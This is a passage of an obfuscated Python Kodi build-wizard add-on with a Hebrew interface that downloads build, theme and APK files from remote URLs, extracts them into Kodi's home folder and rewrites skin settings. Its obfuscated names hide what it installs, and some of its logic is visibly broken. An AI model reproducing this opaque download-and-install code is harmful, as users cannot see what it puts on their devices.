				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3787
		OOOOO0OOOOO0O00OO =int (KODIV );O0OOOO0O00O000O00 =int (float (wiz .checkBuild (O0O00OO0OOOO0OO0O ,'kodi')))#line:3788
		if not OOOOO0OOOOO0O00OO ==O0OOOO0O00O000O00 :#line:3789
			if OOOOO0OOOOO0O00OO ==16 and O0OOOO0O00O000O00 <=15 :O0OOO0000O0OO00OO =False #line:3790
			else :O0OOO0000O0OO00OO =True #line:3791
		else :O0OOO0000O0OO00OO =False #line:3792
		if O0OOO0000O0OO00OO ==True :#line:3793
			O0000000OOO00OOOO =1 #line:3794
		else :#line:3795
			if not over ==False :O0000000OOO00OOOO =1 #line:3796
			else :O0000000OOO00OOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3797
		if O0000000OOO00OOOO :#line:3798
			wiz .clearS ('build')#line:3799
			O000O0O00OO0O0O0O =wiz .checkBuild (O0O00OO0OOOO0OO0O ,'url')#line:3800
			OO0000O0OOO0OOO0O =O0O00OO0OOOO0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3801
			if not wiz .workingURL (O000O0O00OO0O0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3802
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3803
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'version')),'','אנא המתן')#line:3804
			OO00OOO0O000000O0 =os .path .join (PACKAGES ,'%s.zip'%OO0000O0OOO0OOO0O )#line:3805
			try :os .remove (OO00OOO0O000000O0 )#line:3806
			except :pass #line:3807
			logging .warning (O000O0O00OO0O0O0O )#line:3808
			if 'google'in O000O0O00OO0O0O0O :#line:3809
			   O0OO0O0OO0OO0O0OO =googledrive_download (O000O0O00OO0O0O0O ,OO00OOO0O000000O0 ,DP ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'filesize'))#line:3810
			else :#line:3813
			  downloader .download (O000O0O00OO0O0O0O ,OO00OOO0O000000O0 ,DP )#line:3814
			xbmc .sleep (1000 )#line:3815
			OO0OOO0OO0O0OO00O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'version'))#line:3816
			DP .update (0 ,OO0OOO0OO0O0OO00O ,'','Please Wait')#line:3817
			O0O0OOO00OO0000O0 ,O0OOOOO0000O0OOO0 ,O0O0000O00O00O000 =extract .all (OO00OOO0O000000O0 ,HOME ,DP ,title =OO0OOO0OO0O0OO00O )#line:3818
			if int (float (O0O0OOO00OO0000O0 ))>0 :#line:3819
				wiz .fixmetas ()#line:3820
				wiz .lookandFeelData ('save')#line:3821
				wiz .defaultSkin ()#line:3822
				wiz .setS ('buildname',O0O00OO0OOOO0OO0O )#line:3824
				wiz .setS ('buildversion',wiz .checkBuild (O0O00OO0OOOO0OO0O ,'version'))#line:3825
				wiz .setS ('buildtheme','')#line:3826
				wiz .setS ('latestversion',wiz .checkBuild (O0O00OO0OOOO0OO0O ,'version'))#line:3827
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3828
				wiz .setS ('installed','true')#line:3829
				wiz .setS ('extract',str (O0O0OOO00OO0000O0 ))#line:3830
				wiz .setS ('errors',str (O0OOOOO0000O0OOO0 ))#line:3831
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0OOO00OO0000O0 ,O0OOOOO0000O0OOO0 ))#line:3832
				OOO00OO0OO000OOOO =(ADDON .getSetting ("gaiaseren"))#line:3834
				if OOO00OO0OO000OOOO =='true':#line:3835
					wiz .kodi17Fix ()#line:3836
				fastupdatefirstbuild (NOTEID )#line:3837
				skin_homeselect ()#line:3838
				skin_lower ()#line:3839
				rdbuildinstall ()#line:3840
				try :gaiaserenaddon ()#line:3842
				except :pass #line:3843
				adults18 ()#line:3844
				skinfix18 ()#line:3845
				try :os .remove (OO00OOO0O000000O0 )#line:3847
				except :pass #line:3848
				if OOO00OO0OO000OOOO =='true':#line:3850
					wiz .kodi17Fix ()#line:3851
				if int (float (O0OOOOO0000O0OOO0 ))>0 :#line:3853
					O00OOOOOOO00000OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0OOO00OO0000O0 ,'%',COLOR1 ,O0OOOOO0000O0OOO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3854
					if O00OOOOOOO00000OO :#line:3855
						if isinstance (O0OOOOO0000O0OOO0 ,unicode ):#line:3856
							O0O0000O00O00O000 =O0O0000O00O00O000 .encode ('utf-8')#line:3857
						wiz .TextBox (ADDONTITLE ,O0O0000O00O00O000 )#line:3858
				DP .close ()#line:3859
				OO0000OO00OO00O00 =wiz .themeCount (O0O00OO0OOOO0OO0O )#line:3860
				indicator ()#line:3861
				if not OO0000OO00OO00O00 ==False :#line:3862
					buildWizard (O0O00OO0OOOO0OO0O ,'theme')#line:3863
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3864
				if INSTALLMETHOD ==1 :O00O0000000OOO00O =1 #line:3865
				elif INSTALLMETHOD ==2 :O00O0000000OOO00O =0 #line:3866
				else :resetkodi ()#line:3867
				if O00O0000000OOO00O ==1 :wiz .reloadFix ()#line:3869
				else :wiz .killxbmc (True )#line:3870
			else :#line:3871
				if isinstance (O0OOOOO0000O0OOO0 ,unicode ):#line:3872
					O0O0000O00O00O000 =O0O0000O00O00O000 .encode ('utf-8')#line:3873
				O0O00O0O00O0OOO00 =open (OO00OOO0O000000O0 ,'r')#line:3874
				OOO00O0O0O0O00OOO =O0O00O0O00O0OOO00 .read ()#line:3875
				O0OO00O000O0000OO =''#line:3876
				for O0OOOO0O00OOO0O0O in O0OO0O0OO0OO0O0OO :#line:3877
				  O0OO00O000O0000OO ='key: '+O0OO00O000O0000OO +'\n'+O0OOOO0O00OOO0O0O #line:3878
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0000O00O00O000 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OO00O000O0000OO )#line:3879
		else :#line:3880
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3881
	elif OO00OOO0OO00O00O0 =='theme':#line:3882
		if theme ==None :#line:3883
			OO0000OO00OO00O00 =wiz .checkBuild (O0O00OO0OOOO0OO0O ,'theme')#line:3884
			OOO0OOOOO00O0OO00 =[]#line:3885
			if not OO0000OO00OO00O00 =='http://'and wiz .workingURL (OO0000OO00OO00O00 )==True :#line:3886
				OOO0OOOOO00O0OO00 =wiz .themeCount (O0O00OO0OOOO0OO0O ,False )#line:3887
				if len (OOO0OOOOO00O0OO00 )>0 :#line:3888
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0O00OO0OOOO0OO0O ,COLOR1 ,len (OOO0OOOOO00O0OO00 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3889
						wiz .log ("Theme List: %s "%str (OOO0OOOOO00O0OO00 ))#line:3890
						O0O00OO00O00OOO0O =DIALOG .select (ADDONTITLE ,OOO0OOOOO00O0OO00 )#line:3891
						wiz .log ("Theme install selected: %s"%O0O00OO00O00OOO0O )#line:3892
						if not O0O00OO00O00OOO0O ==-1 :theme =OOO0OOOOO00O0OO00 [O0O00OO00O00OOO0O ];OOO00000O00O00OO0 =True #line:3893
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3894
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3895
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3896
		else :OOO00000O00O00OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0O00OO0OOOO0OO0O ,wiz .checkBuild (O0O00OO0OOOO0OO0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3897
		if OOO00000O00O00OO0 :#line:3898
			O000OO0OOOO00OOO0 =wiz .checkTheme (O0O00OO0OOOO0OO0O ,theme ,'url')#line:3899
			OO0000O0OOO0OOO0O =O0O00OO0OOOO0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3900
			if not wiz .workingURL (O000OO0OOOO00OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3901
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3902
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3903
			OO00OOO0O000000O0 =os .path .join (PACKAGES ,'%s.zip'%OO0000O0OOO0OOO0O )#line:3904
			try :os .remove (OO00OOO0O000000O0 )#line:3905
			except :pass #line:3906
			downloader .download (O000OO0OOOO00OOO0 ,OO00OOO0O000000O0 ,DP )#line:3907
			xbmc .sleep (1000 )#line:3908
			DP .update (0 ,"","Installing %s "%O0O00OO0OOOO0OO0O )#line:3909
			OOOO0OOOOO0O0O000 =False #line:3910
			if url not in ["fresh","normal"]:#line:3911
				OOOO0OOOOO0O0O000 =testTheme (OO00OOO0O000000O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3912
				O0O0O000O000OO00O =testGui (OO00OOO0O000000O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3913
				if OOOO0OOOOO0O0O000 ==True :#line:3914
					wiz .lookandFeelData ('save')#line:3915
					OO0000OO00OOO00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3916
					O0000OO000OOO0O00 =xbmc .getSkinDir ()#line:3917
					skinSwitch .swapSkins (OO0000OO00OOO00OO )#line:3919
					O00O0O0O00OOOOOO0 =0 #line:3920
					xbmc .sleep (1000 )#line:3921
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O0O00OOOOOO0 <150 :#line:3922
						O00O0O0O00OOOOOO0 +=1 #line:3923
						xbmc .sleep (1000 )#line:3924
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3925
						wiz .ebi ('SendClick(11)')#line:3926
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3927
					xbmc .sleep (1000 )#line:3928
			OO0OOO0OO0O0OO00O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3929
			DP .update (0 ,OO0OOO0OO0O0OO00O ,'','אנא המתן')#line:3930
			O0O0OOO00OO0000O0 ,O0OOOOO0000O0OOO0 ,O0O0000O00O00O000 =extract .all (OO00OOO0O000000O0 ,HOME ,DP ,title =OO0OOO0OO0O0OO00O )#line:3931
			wiz .setS ('buildtheme',theme )#line:3932
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O0OOO00OO0000O0 ,O0OOOOO0000O0OOO0 ))#line:3933
			DP .close ()#line:3934
			if url not in ["fresh","normal"]:#line:3935
				wiz .forceUpdate ()#line:3936
				if KODIV >=17 :wiz .kodi17Fix ()#line:3937
				if O0O0O000O000OO00O ==True :#line:3938
					wiz .lookandFeelData ('save')#line:3939
					wiz .defaultSkin ()#line:3940
					O0000OO000OOO0O00 =wiz .getS ('defaultskin')#line:3941
					skinSwitch .swapSkins (O0000OO000OOO0O00 )#line:3942
					O00O0O0O00OOOOOO0 =0 #line:3943
					xbmc .sleep (1000 )#line:3944
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O0O00OOOOOO0 <150 :#line:3945
						O00O0O0O00OOOOOO0 +=1 #line:3946
						xbmc .sleep (1000 )#line:3947
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3949
						wiz .ebi ('SendClick(11)')#line:3950
					wiz .lookandFeelData ('restore')#line:3951
				elif OOOO0OOOOO0O0O000 ==True :#line:3952
					skinSwitch .swapSkins (O0000OO000OOO0O00 )#line:3953
					O00O0O0O00OOOOOO0 =0 #line:3954
					xbmc .sleep (1000 )#line:3955
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O0O00OOOOOO0 <150 :#line:3956
						O00O0O0O00OOOOOO0 +=1 #line:3957
						xbmc .sleep (1000 )#line:3958
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3960
						wiz .ebi ('SendClick(11)')#line:3961
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3962
					wiz .lookandFeelData ('restore')#line:3963
				else :#line:3964
					wiz .ebi ("ReloadSkin()")#line:3965
					xbmc .sleep (1000 )#line:3966
					wiz .ebi ("Container.Refresh")#line:3967
		else :#line:3968
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3969
def skin_homeselect ():#line:3973
	try :#line:3975
		O00O0O00OO000O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3976
		OOOO0000O0000OO0O =open (O00O0O00OO000O0O0 ,'r')#line:3978
		OOO0O0OO0OOO0O000 =OOOO0000O0000OO0O .read ()#line:3979
		OOOO0000O0000OO0O .close ()#line:3980
		OO0OO0O00OO00OOOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:3981
		OOO0OOOOO000OOOOO =re .compile (OO0OO0O00OO00OOOO ).findall (OOO0O0OO0OOO0O000 )[0 ]#line:3982
		OOOO0000O0000OO0O =open (O00O0O00OO000O0O0 ,'w')#line:3983
		OOOO0000O0000OO0O .write (OOO0O0OO0OOO0O000 .replace ('<setting id="HomeS" type="string%s/setting>'%OOO0OOOOO000OOOOO ,'<setting id="HomeS" type="string"></setting>'))#line:3984
		OOOO0000O0000OO0O .close ()#line:3985
	except :#line:3986
		pass #line:3987
def skin_lower ():#line:3990
	OO0O00OO0O00O0OOO =(ADDON .getSetting ("lower"))#line:3991
	if OO0O00OO0O00O0OOO =='true':#line:3992
		try :#line:3995
			OO0O00000000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3996
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'r')#line:3998
			OOOOO000O00000OO0 =O0OO0O0OOOO00O00O .read ()#line:3999
			O0OO0O0OOOO00O00O .close ()#line:4000
			O0000O00OO000OO0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4001
			OOOOO0O0OO00O0OOO =re .compile (O0000O00OO000OO0O ).findall (OOOOO000O00000OO0 )[0 ]#line:4002
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'w')#line:4003
			O0OO0O0OOOO00O00O .write (OOOOO000O00000OO0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOOO0O0OO00O0OOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4004
			O0OO0O0OOOO00O00O .close ()#line:4005
			OO0O00000000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4007
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'r')#line:4009
			OOOOO000O00000OO0 =O0OO0O0OOOO00O00O .read ()#line:4010
			O0OO0O0OOOO00O00O .close ()#line:4011
			O0000O00OO000OO0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4012
			OOOOO0O0OO00O0OOO =re .compile (O0000O00OO000OO0O ).findall (OOOOO000O00000OO0 )[0 ]#line:4013
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'w')#line:4014
			O0OO0O0OOOO00O00O .write (OOOOO000O00000OO0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOOO0O0OO00O0OOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4015
			O0OO0O0OOOO00O00O .close ()#line:4016
			OO0O00000000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4018
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'r')#line:4020
			OOOOO000O00000OO0 =O0OO0O0OOOO00O00O .read ()#line:4021
			O0OO0O0OOOO00O00O .close ()#line:4022
			O0000O00OO000OO0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4023
			OOOOO0O0OO00O0OOO =re .compile (O0000O00OO000OO0O ).findall (OOOOO000O00000OO0 )[0 ]#line:4024
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'w')#line:4025
			O0OO0O0OOOO00O00O .write (OOOOO000O00000OO0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOOO0O0OO00O0OOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4026
			O0OO0O0OOOO00O00O .close ()#line:4027
			OO0O00000000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4031
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'r')#line:4033
			OOOOO000O00000OO0 =O0OO0O0OOOO00O00O .read ()#line:4034
			O0OO0O0OOOO00O00O .close ()#line:4035
			O0000O00OO000OO0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4036
			OOOOO0O0OO00O0OOO =re .compile (O0000O00OO000OO0O ).findall (OOOOO000O00000OO0 )[0 ]#line:4037
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'w')#line:4038
			O0OO0O0OOOO00O00O .write (OOOOO000O00000OO0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOOO0O0OO00O0OOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4039
			O0OO0O0OOOO00O00O .close ()#line:4040
			OO0O00000000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4044
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'r')#line:4046
			OOOOO000O00000OO0 =O0OO0O0OOOO00O00O .read ()#line:4047
			O0OO0O0OOOO00O00O .close ()#line:4048
			O0000O00OO000OO0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4049
			OOOOO0O0OO00O0OOO =re .compile (O0000O00OO000OO0O ).findall (OOOOO000O00000OO0 )[0 ]#line:4050
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'w')#line:4051
			O0OO0O0OOOO00O00O .write (OOOOO000O00000OO0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOOO0O0OO00O0OOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4052
			O0OO0O0OOOO00O00O .close ()#line:4053
			OO0O00000000O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4057
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'r')#line:4059
			OOOOO000O00000OO0 =O0OO0O0OOOO00O00O .read ()#line:4060
			O0OO0O0OOOO00O00O .close ()#line:4061
			O0000O00OO000OO0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4062
			OOOOO0O0OO00O0OOO =re .compile (O0000O00OO000OO0O ).findall (OOOOO000O00000OO0 )[0 ]#line:4063
			O0OO0O0OOOO00O00O =open (OO0O00000000O00O0 ,'w')#line:4064
			O0OO0O0OOOO00O00O .write (OOOOO000O00000OO0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOOO0O0OO00O0OOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4065
			O0OO0O0OOOO00O00O .close ()#line:4066
		except :#line:4071
			pass #line:4072
def thirdPartyInstall (OOO000OO0000O00OO ,OOO0OOOOOO0O000OO ):#line:4074
	if not wiz .workingURL (OOO0OOOOOO0O000OO ):#line:4075
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4076
	OO0OO0OOO00O0OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OO0000O00OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4077
	if OO0OO0OOO00O0OO00 ==1 :#line:4078
		freshStart ('third',True )#line:4079
	wiz .clearS ('build')#line:4080
	O0OOOOO00O0O000OO =OOO000OO0000O00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4081
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4082
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000OO0000O00OO ),'','אנא המתן')#line:4083
	OO0000O0O0OOO0O00 =os .path .join (PACKAGES ,'%s.zip'%O0OOOOO00O0O000OO )#line:4084
	try :os .remove (OO0000O0O0OOO0O00 )#line:4085
	except :pass #line:4086
	downloader .download (OOO0OOOOOO0O000OO ,OO0000O0O0OOO0O00 ,DP )#line:4087
	xbmc .sleep (1000 )#line:4088
	O0O000O000O0000O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000OO0000O00OO )#line:4089
	DP .update (0 ,O0O000O000O0000O0 ,'','אנא המתן')#line:4090
	O0O0O00OO00O0OO00 ,O0O0OO000000O0OOO ,OOOO0OO00O000OOO0 =extract .all (OO0000O0O0OOO0O00 ,HOME ,DP ,title =O0O000O000O0000O0 )#line:4091
	if int (float (O0O0O00OO00O0OO00 ))>0 :#line:4092
		wiz .fixmetas ()#line:4093
		wiz .lookandFeelData ('save')#line:4094
		wiz .defaultSkin ()#line:4095
		wiz .setS ('installed','true')#line:4097
		wiz .setS ('extract',str (O0O0O00OO00O0OO00 ))#line:4098
		wiz .setS ('errors',str (O0O0OO000000O0OOO ))#line:4099
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O0O00OO00O0OO00 ,O0O0OO000000O0OOO ))#line:4100
		try :os .remove (OO0000O0O0OOO0O00 )#line:4101
		except :pass #line:4102
		if int (float (O0O0OO000000O0OOO ))>0 :#line:4103
			OO000OOOOOO0O00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000OO0000O00OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0O00OO00O0OO00 ,'%',COLOR1 ,O0O0OO000000O0OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4104
			if OO000OOOOOO0O00O0 :#line:4105
				if isinstance (O0O0OO000000O0OOO ,unicode ):#line:4106
					OOOO0OO00O000OOO0 =OOOO0OO00O000OOO0 .encode ('utf-8')#line:4107
				wiz .TextBox (ADDONTITLE ,OOOO0OO00O000OOO0 )#line:4108
	DP .close ()#line:4109
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4110
	if INSTALLMETHOD ==1 :OOOO00OO00OOO00OO =1 #line:4111
	elif INSTALLMETHOD ==2 :OOOO00OO00OOO00OO =0 #line:4112
	else :OOOO00OO00OOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4113
	if OOOO00OO00OOO00OO ==1 :wiz .reloadFix ()#line:4114
	else :wiz .killxbmc (True )#line:4115
def testTheme (O000OO0OO000O0OOO ):#line:4117
	OO0OO0OOO0O0O0000 =zipfile .ZipFile (O000OO0OO000O0OOO )#line:4118
	for O0O00O00O000O000O in OO0OO0OOO0O0O0000 .infolist ():#line:4119
		if '/settings.xml'in O0O00O00O000O000O .filename :#line:4120
			return True #line:4121
	return False #line:4122
def testGui (O0O00OOOOO0OOOOO0 ):#line:4124
	OOO0OO0OOOOOO00OO =zipfile .ZipFile (O0O00OOOOO0OOOOO0 )#line:4125
	for OOOOO00O0OO0O0OO0 in OOO0OO0OOOOOO00OO .infolist ():#line:4126
		if '/guisettings.xml'in OOOOO00O0OO0O0OO0 .filename :#line:4127
			return True #line:4128
	return False #line:4129
def apkInstaller (O0OOOOOO0O0O00000 ,OO0OOO0O00000OOO0 ):#line:4131
	wiz .log (O0OOOOOO0O0O00000 )#line:4132
	wiz .log (OO0OOO0O00000OOO0 )#line:4133
	if wiz .platform ()=='android':#line:4134
		OOO0O0OO0OOO0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOO0O0O00000 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4135
		if not OOO0O0OO0OOO0OOO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4136
		O0O00OO0OOO00OOO0 =O0OOOOOO0O0O00000 #line:4137
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4138
		if not wiz .workingURL (OO0OOO0O00000OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4139
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OO0OOO00OOO0 ),'','אנא המתן')#line:4140
		OO0OOOO00O00O00OO =os .path .join (PACKAGES ,"%s.apk"%O0OOOOOO0O0O00000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4141
		try :os .remove (OO0OOOO00O00O00OO )#line:4142
		except :pass #line:4143
		downloader .download (OO0OOO0O00000OOO0 ,OO0OOOO00O00O00OO ,DP )#line:4144
		xbmc .sleep (100 )#line:4145
		DP .close ()#line:4146
		notify .apkInstaller (O0OOOOOO0O0O00000 )#line:4147
